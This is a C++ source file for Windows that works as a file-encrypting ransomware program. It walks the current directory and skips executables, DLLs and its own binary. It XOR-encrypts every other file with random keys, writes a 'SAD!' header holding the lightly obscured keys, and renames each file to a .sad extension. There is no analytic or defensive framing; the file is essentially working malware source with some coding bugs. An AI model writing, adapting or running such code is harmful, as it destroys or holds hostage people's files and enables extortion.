#include <windows.h>
#include <iostream>
#include <vector>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h> 
#include <time.h> 
#include <string>

typedef struct _SAD_HEADER {
	BYTE   sig[5];
	DWORD  extension;
	DWORD  originalSize;
	DWORD  XOR_KEY;
	DWORD  ENC_KEY;
	DWORD  INT_KEY;
} SAD_HEADER, *PSAD_HEADER;

#define DEBUG false

DWORD fsize(FILE* stream) {
		struct _stat fd;
		if(_fstat(_fileno(stream), &fd) != 0){
			printf("Could not get file infos!");
			return -1;
		}
		return fd.st_size;
}

BYTE* GenKey(int size)  
{  
	 void* key_buffer = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	 for(int i = 0;i < size;i++){
	 	*((BYTE*)key_buffer+i) = rand() % (size - 0x10000000) + 0x10000000;
		
	 }
     return (BYTE*)key_buffer; 
}

void* GetFSbuffer(LPSTR fPath, SIZE_T fSize) {
	FILE* stream = fopen(fPath, "rb");
	
	void* buffer = VirtualAlloc(NULL, fSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if(fread(buffer, sizeof(BYTE), fSize, stream) != fSize) {
		printf("Could not read file :( %u", GetLastError());
		return NULL;
	}
	fclose(stream);
	return buffer;
}

DWORD GetFileSize(LPSTR fPath){
	FILE* stream = fopen(fPath, "rb");
	DWORD size = fsize(stream);
	fclose(stream);
	return size;
}

bool AppendToFile(char* path, void* pData, size_t size){
	HANDLE hFile = CreateFileA(path, FILE_APPEND_DATA, 0, NULL, OPEN_EXISTING , FILE_ATTRIBUTE_NORMAL, NULL);
	
	if(hFile == INVALID_HANDLE_VALUE)
		return false;
		
	if(!WriteFile(hFile, pData, size, nullptr, nullptr))
		return false;
	
	CloseHandle(hFile);
	return true;
}

void AppendZeroBytes(LPSTR _PATH, SIZE_T _Rsize){
	void* Bytes = VirtualAlloc(NULL, _Rsize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	if(!Bytes){
		printf("Could not alloc :(");
		ExitProcess(-1);
	}
	RtlZeroMemory(Bytes, _Rsize);
	
	if(!AppendToFile(_PATH, Bytes, _Rsize)) {
		printf("> Failed appending bytes :( %u", GetLastError());
		ExitProcess(-1);
	}
	VirtualFree(Bytes, 0, MEM_RELEASE);
}

LPSTR GetExtension(LPSTR buffer, SIZE_T size) {
	for(size_t i = 0;i < size;i++){
		if(buffer[i] == '.') {
			return (LPSTR)buffer+i;
		}
	}
	return NULL;
}

LPSTR ChangeExtension(LPSTR buffer, size_t sz1 ,LPCSTR new_extension, size_t sz2){
	for(size_t i = 0;i < sz1;i++){
		if(buffer[i] == '.')
		{
		   	memcpy((void*)(buffer+i+1), new_extension, sz2);
			buffer[i+sz2+1] = '\0';
			break;
		}
	}
	return buffer;
}

bool Encrypt(LPSTR file, DWORD* extension, DWORD internal_key){
	BYTE sig[] = {0x53,0x41,0x44,0x21,0xa};
	
	//get file stream buffer
	DWORD size   = GetFileSize(file);
	if(size == 0)
		return false;
	
	void* buffer = GetFSbuffer(file, size);
	
	int additionalBytes = 0;
	
	//round up size to multiple of 4
	if(size % 4 != 0) {
		int remainder = size % 4;
		additionalBytes = size + (4 - remainder);
		additionalBytes = additionalBytes - size;	
	}

	if(additionalBytes > 0)
		AppendZeroBytes(file, additionalBytes);	
		
	/* generate xor keys */
	DWORD xor_key  = *(DWORD*)GenKey(4);
	DWORD main_key = *(DWORD*)GenKey(4);

	for(int i = 0;i < size/4;i++){//the size is in dwords
		DWORD* sequence = (DWORD*)buffer+i;
		if(*sequence == 0x00000000)
			continue;
		else
			*sequence ^= xor_key;
			*sequence ^= main_key;
	}	
	
	//cipher cipher keys
	xor_key  ^= internal_key;
	main_key ^= internal_key;
	
	PSAD_HEADER header = new SAD_HEADER({{0x53,0x41,0x44,0x21,0xa}, *extension, (size^internal_key), xor_key, main_key, internal_key});
	
	HANDLE hFile = CreateFileA(file, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if(hFile == INVALID_HANDLE_VALUE)
		return false;

	if(!WriteFile(hFile, (void*)&(*header), sizeof(*header), nullptr, nullptr)){
		return false;
	}
	
	CloseHandle(hFile);
	
	char newFile[MAX_PATH];
	memcpy((void*)newFile, (const void*)file, strlen(file));
	
	ChangeExtension((LPSTR)newFile, strlen(file), "sad", 3);
	MoveFileA(file, newFile);
	
	if(!AppendToFile(newFile, buffer, size))
	{
		return false;
	}
	
	VirtualFree((void*)xor_key, 0, MEM_RELEASE);
	VirtualFree((void*)main_key, 0, MEM_RELEASE);
	VirtualFree((void*)internal_key, 0, MEM_RELEASE);
	VirtualFree(buffer, 0, MEM_RELEASE);
	
	return true;
}

int main(int argc, char* argv[]){
	srand(time(NULL));
	
	//first list all files in current directory
	WIN32_FIND_DATA fd;
	char DIRbuffer[MAX_PATH];
	char* rootDIR = nullptr;
	
	DWORD written = GetCurrentDirectory(MAX_PATH, (LPSTR)&DIRbuffer);
	if(!written){
		return -1;
	}
	strcat(DIRbuffer, "\\");
	strcat(DIRbuffer, "*");
	
	HANDLE hFFile = FindFirstFileA(DIRbuffer, &fd);
	if(hFFile == INVALID_HANDLE_VALUE){
		return -1;	
	}
	
	char currModName[FILENAME_MAX];
	GetModuleFileNameA(NULL, currModName, sizeof(currModName));
	
	do {
		if(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			continue;
		else {
			char buffer[MAX_PATH];
			DWORD path_length = GetFullPathNameA(fd.cFileName, sizeof(buffer), (LPSTR)&buffer, NULL);
			if(!path_length){
				break;
			}
			
			if(strcmp(buffer,currModName) != 0){
				LPSTR extension = GetExtension(buffer, path_length);
				if(!extension){
					ExitProcess(-1);
				}
				std::string ext = (std::string)extension;

				char cwd[MAX_PATH];
				GetCurrentDirectoryA(MAX_PATH,cwd);

				if(ext != ".exe" and 
					ext != ".dll" and
					ext != ".sad"){

					BYTE* internal_key 		 = GenKey(4);//decrypt header
					DWORD internalExtension  = *(DWORD*)(BYTE*)extension ^ *(DWORD*)internal_key;
					Encrypt((LPSTR)buffer, &internalExtension, *(DWORD*)internal_key);
				}	
			}
		}
			
	} while (FindNextFile(hFFile, &fd) != 0);
	
	FindClose(hFFile);

	return 0;
}
